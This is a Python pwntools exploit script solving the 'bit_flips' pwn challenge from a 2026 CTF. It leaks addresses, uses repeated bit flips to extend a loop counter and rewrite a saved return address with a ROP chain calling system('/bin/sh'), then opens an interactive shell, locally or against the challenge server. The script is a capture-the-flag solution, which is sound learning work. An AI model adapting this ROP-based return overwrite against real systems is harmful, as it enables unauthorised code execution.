#!/usr/bin/env python3
import os

from pwn import *

TARGET_PATH = os.path.realpath("/ctf-writeups/2026/0xfun-ctf/pwn/bit_flips/dist/main")
LIBC_PATH = os.path.realpath("/lib/x86_64-linux-gnu/libc.so.6")

elf = context.binary = ELF(TARGET_PATH)
libc = ELF(LIBC_PATH)

context.update(log_level="debug", terminal=["tmux", "split-window", "-h"])


def get_stream():
    if "remote" in sys.argv:
        return remote("chall.0xfun.org", 16718)

    return process(TARGET_PATH)


def attach_gdb(r):
    if "debug" in sys.argv:
        bkps = []
        cmds = []

        gdbscript = ["break {}".format(x) for x in bkps] + cmds
        gdb.attach(r, "\n".join(gdbscript))


def xor(r, addr, from_value, to_value):
    value = from_value ^ to_value

    for i, j in enumerate(bin(value)[::-1][:-2]):
        if j == "0":
            continue

        r.sendlineafter(b"> ", f"{hex(addr + i // 8)} {i & 7}".encode())


def exploit(r):
    r.recvuntil(b"&main = ")
    main_addr = int(r.recvline().decode().strip(), 16)
    elf.address = main_addr - elf.sym.main

    r.recvuntil(b"&system = ")
    system_addr = int(r.recvline().decode().strip(), 16)
    libc.address = system_addr - libc.sym.system

    r.recvuntil(b"&address = ")
    stack_addr = int(r.recvline().decode().strip(), 16)
    stack_counter = stack_addr - 0x4
    stack_ret = stack_addr + 0x18

    xor(r, stack_counter + 3, 0, 0x80)

    binsh = next(libc.search(b"/bin/sh\0"))
    rop = ROP(libc)
    rop.raw(rop.ret)
    rop.call(libc.sym.system, [binsh])
    payload = rop.chain()
    stack_org = [
        elf.sym.main + 0x1D,
        stack_addr + 0xC0,
        libc.libc_start_main_return,
        stack_addr + 0x70,
    ]

    for i in range(0, len(payload), 8):
        xor(
            r,
            stack_ret + i,
            stack_org[i // 8],
            u64(payload[i : i + 8].ljust(8, b"\0")),
        )

    xor(r, stack_counter + 3, 0, 0x80)
    r.interactive()


def main():
    r = get_stream()
    attach_gdb(r)
    exploit(r)


if __name__ == "__main__":
    main()
